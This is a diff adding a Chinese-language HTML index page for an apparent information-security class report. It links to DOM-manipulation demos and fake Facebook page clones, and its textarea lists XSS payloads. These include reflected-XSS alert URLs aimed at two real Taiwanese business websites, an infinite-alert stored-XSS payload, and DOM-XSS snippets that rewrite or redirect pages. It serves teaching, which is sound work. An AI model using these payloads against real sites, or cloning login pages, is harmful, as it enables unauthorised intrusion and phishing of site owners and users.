@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>資訊安全報告</title>
+    <script
+    src="https://code.jquery.com/jquery-3.6.1.slim.js"
+    integrity="sha256-tXm+sa1uzsbFnbXt8GJqsgi2Tw+m4BLGDof6eUPjbtk="
+    crossorigin="anonymous"></script>
+    <style>
+        .note{
+            height: 100vh;
+        }
+        .list{
+            display: flex;
+            flex-direction: column;
+            margin: auto;
+            width: 960px;
+        }
+        .pack{
+            height: 50px;
+            width: 960px;
+            background-color: rgb(243, 186, 63);
+            display: flex;
+            margin: auto;
+            justify-content: center;
+        }
+        .pack div{
+            margin: auto;
+            background-color: rgb(236, 205, 137);
+            height: auto;
+            padding: 12px;
+            width: 50%;
+            text-align: center;
+            border: solid 2px black;
+        }
+        .pack a{
+            display: inline-block;
+            text-decoration: none;
+            color: black;
+            font-size: large;
+        }
+        .packtit{
+            background-color: rgb(228, 227, 227);
+            height: 30px;
+            width: 100%;
+            text-align: center;
+        }
+        .packtit p{
+            height: 100%;
+            border: solid 2px black;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            margin: auto;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="list">
+        <div class="packtit"><p>API範例Code</p></div>
+        <div class="pack">
+            <div class="age"><a href="/API-地理位置.html" target="_blank" >3-2-1 地理位置API</a></div>
+            <div class="age"><a href="/API-網路儲存.html" target="_blank" >3-2-2 網路儲存API</a></div>
+            <div class="age"><a href="/SVG.html" target="_blank" >3-2-5 SVG圖形</a></div>
+        </div>
+        <p> </p>
+        <div class="packtit"><p>DOM操作範例Code</p></div>
+        <div class="pack">
+            <div class="age"><a href="/3-1DOM操作-直接編寫HTML.html" target="_blank">3-3-1 DOM操作-直接編寫HTML</a></div>
+            <div class="age"><a href="/3-2DOM操作-直接修改DOM.html" target="_blank">3-3-2 DOM操作-直接修改DOM</a></div>
+            <div class="age"><a href="/3-3DOM操作-重新定向文檔URL.html" target="_blank">3-3-3 DOM操作-重新定向文檔URL</a></div>
+        </div>
+        <div class="pack">
+            <div class="age"><a href="/3-4DOM操作-打開和修改視窗.html" target="_blank">3-3-4 DOM操作-打開和修改視窗</a></div>
+            <div class="age"><a href="/3-5DOM操作-直接執行Script.html" target="_blank">3-3-5 DOM操作-直接執行Script</a></div>
+        </div>
+        <p> </p>
+
+
+        <div class="packtit"><p>隱藏範例Code</p></div>
+        <div class="pack">
+            <div class="age"><a href="/隱藏-視窗事件.html" target="_blank" >3-1-1 HTML5操作-視窗事件</a></div>
+            <div class="age"><a href="/隱藏-表單事件.html" target="_blank" >3-1-2 HTML5操作-視窗事件</a></div>
+            <div class="age"><a href="/隱藏-拖動事件.html" target="_blank" >3-1-3 HTML5操作-拖動事件</a></div>
+        </div>
+        <div class="pack">
+            <div class="age"><a href="/隱藏-媒體事件.html" target="_blank" >3-1-4 HTML5操作-媒體事件</a></div>
+            <div class="age"><a href="/隱藏-雜項事件.html" target="_blank" >3-1-5 HTML5操作-雜項事件</a></div>
+        </div>
+        <p> </p>
+        <div class="packtit"><p>示範資料</p></div>
+        <div class="pack">
+            <div class="age"><a href="https://lzk-test.github.io/testFaceBook.html" target="_blank" >假的電腦版FB網頁</a></div>
+            <div class="age"><a href="https://lzk-test.github.io/testmFaceBook.html" target="_blank" >假的手機版FB網頁</a></div>
+        </div>
+    </div>
+    <h2>內容</h2>
+    <div class="note">
+        <textarea>
+            [中華機械-搜尋頁面]
+            https://www.capitalmachinery.com.tw/
+            https://www.capitalmachinery.com.tw/search-result.php?keyword=
+            
+            [清心福全-門市據點]
+            https://www.chingshin.tw/
+            https://www.chingshin.tw/store.php/?city=
+            
+            --------------------------------------------------------------------------
+            [反射型XSS] alert彈出
+            <script>alert('OKOK')</script>
+            https://www.capitalmachinery.com.tw/search-result.php?keyword=<script>alert('OKOK')</script>
+            https://www.chingshin.tw/store.php/?city=<script>alert('OKOK')</script>
+            
+            --------------------------------------------------------------------------
+            [儲存型XSS] 無限alert彈出
+            while(1){
+                alert('OK');
+            }
+            https://xss-game.appspot.com/level2/frame
+            
+            <img src="" onerror="while(1){alert('OK');}">
+            
+            --------------------------------------------------------------------------
+            [DOM型XSS]
+             1.編寫原始 HTML
+            <script>
+            window.onload = function(){ 
+            document.write('TEXT')
+            }
+            </script>
+            
+             2.直接修改DOM 修改navbar導覽列
+            <script>
+            document.getElementById('mainNav').style.background='yellow';
+            </script>
+            
+             3.重定向document網址
+            <script>
+            document.location='https://www.google.com'
+            </script>
+            
+            
+        </textarea>
+    </div>
+</body>
+</html>
